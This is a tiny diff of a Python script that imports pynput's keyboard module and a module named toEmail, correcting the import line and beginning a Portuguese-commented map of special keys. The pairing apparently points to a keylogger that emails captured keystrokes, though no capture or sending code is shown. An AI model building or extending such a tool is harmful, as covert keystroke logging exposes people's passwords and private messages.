@@ -1,5 +1,5 @@
 from pynput import keyboard
-import toEmail.pyw as toEmail
+import toEmail
 
 # Mapeamento de teclas especiais para o texto correspondente
 TECLAS_ESPECIAIS = {
